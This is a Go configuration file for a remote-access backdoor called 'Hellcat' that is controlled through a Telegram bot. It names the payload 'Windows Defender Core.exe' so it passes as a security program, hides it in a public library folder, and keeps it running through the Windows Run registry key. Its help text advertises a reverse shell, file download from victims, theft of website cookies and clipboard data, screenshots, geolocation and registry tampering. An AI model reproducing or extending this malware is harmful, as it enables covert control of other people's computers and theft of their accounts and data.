package config

const (
	/*
		Telegram bot configurations.
	*/
	API        = ""
	MSG_REPLY  = false
	DEBUG_MODE = false
	TIMEOUT    = 30

	/*
		Payload configurations.
	*/
	NNAME          = "Windows Defender Core.exe"
	REMOVE_SERVICE = "rm.bat"
	PAYLOAD_PATH   = "C:\\Users\\Public\\Libraries\\"
	HKEY_STARTUP   = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	HIDE_FILE      = true
)

const HELP = `
	░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
	░░░░░ ███████ ]▄▄▄▄▄▄▄▄▃ ░░░░░░░░░░░░
	▂▄▅█████████▅▄▃▂░░░░░ ᵂᵉˡᶜᵒᵐᵉ ᵗᵒ ᴴᵉˡˡᶜᵃᵗ ░░░░░
	I███████████████████].░░░░░░░░░░░░░░░░░
	◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...░░░░░░░░░░░░░░░░
	░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
	
	❑ Home
   
	/help - Show all commands.
	/kill - Kill current running backdoor.
	/remove - Self-Remove current backdoor.

	❑ Tools
	
	/shell, /sh <cmd> - Reverse shell from client machine.
	/download <path> - Download file from client machine.
	/cookie <name> <url> - Retrieve the website's cookies from client.
	/screen <name> - Screenshot client display.
	/geoip <city-mmdb> - Retrieve the client geolocation from IPv4.

	/registry <method> <name> <value> <path>

		--set		Set registry key to client machine.
		--del		Delete registry key from client machine. 

	/clipboard - Retrieve Clipboard data from client.
`
